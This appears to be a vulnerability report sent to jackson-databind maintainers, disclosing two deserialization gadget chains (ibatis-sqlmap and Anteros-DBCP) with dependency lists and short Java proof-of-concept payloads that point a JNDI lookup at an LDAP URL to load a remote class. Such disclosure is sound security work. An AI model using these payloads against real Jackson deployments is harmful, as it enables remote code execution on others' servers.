hello，We're threedr3am and V1ZkRA.I found two new jackson rce gadget chain again.I'm sorry to bother you with so many reports recently. So, this time I've organized multiple gadgets to submit together.

## (First gadget - ibatis-sqlmap)
### 一、New jackson-databind remote code execution exploit gadget chain
1. The existence of ibatis-sqlmap dependencies may lead to remote code execution

I found a new exploit chain，the class is "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"，On a javaee system using Jackson to parse Json, if there is an ibatis-sqlmap dependency, it can remotely execute RCE using defaultType

### 二、Vulnerability self-assessment
Recommended rating: High

### 三、Vulnerability details
1. Principle: When com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig is deserialized, by specifying the value corresponding to the json key of properties->UserTransaction as the ldap service, the ldap service can refer to the malicious class, thereby triggering its setProperties method during deserialization. A chain that finally triggers InitialContext.lookup to the malicious class of the ldap service, thereby loading the remote class to local execution and achieving remote code execution RCE.

2. pom.xml

```
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.10.3</version>
</dependency>

<dependency>
      <groupId>org.apache.ibatis</groupId>
      <artifactId>ibatis-sqlmap</artifactId>
      <version>2.3.4.726</version>
</dependency>

<dependency>
      <groupId>javax</groupId>
      <artifactId>javaee-api</artifactId>
      <version>8.0.1</version>
</dependency>
```

3. poc：

```
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", {\"properties\": {\"UserTransaction\":\"ldap://localhost:43658/Calc\"}}]";
mapper.readValue(json, Object.class);
```

## (Second gadget - Anteros-DBCP)
### 一、New jackson-databind remote code execution exploit gadget chain
1. The existence of Anteros-DBCP dependencies may lead to remote code execution

I found a new exploit chain，the class is "br.com.anteros.dbcp.AnterosDBCPConfig"，On a system using Jackson to parse Json, if there is an Anteros-DBCP dependency, it can remotely execute RCE using defaultType

### 二、Vulnerability self-assessment
Recommended rating: High

### 三、Vulnerability details
1. Principle: When br.com.anteros.dbcp.AnterosDBCPConfig is deserialized, by specifying the value corresponding to the json key of healthCheckRegistry as the ldap service, the ldap service can refer to the malicious class, thereby triggering its setHealthCheckRegistry method during deserialization. A chain that finally triggers InitialContext.lookup to the malicious class of the ldap service, thereby loading the remote class to local execution and achieving remote code execution RCE.

2. pom.xml

```
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.10.3</version>
</dependency>

<dependency>
      <groupId>com.codahale.metrics</groupId>
      <artifactId>metrics-healthchecks</artifactId>
      <version>3.0.2</version>
</dependency>
<dependency>
      <groupId>br.com.anteros</groupId>
      <artifactId>Anteros-Core</artifactId>
      <version>1.2.1</version>
</dependency>
<dependency>
      <groupId>br.com.anteros</groupId>
      <artifactId>Anteros-DBCP</artifactId>
      <version>1.0.1</version>
</dependency>
```

3. poc：

```
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\": \"ldap://localhost:43658/Calc\"}]";
mapper.readValue(json, Object.class);
```
...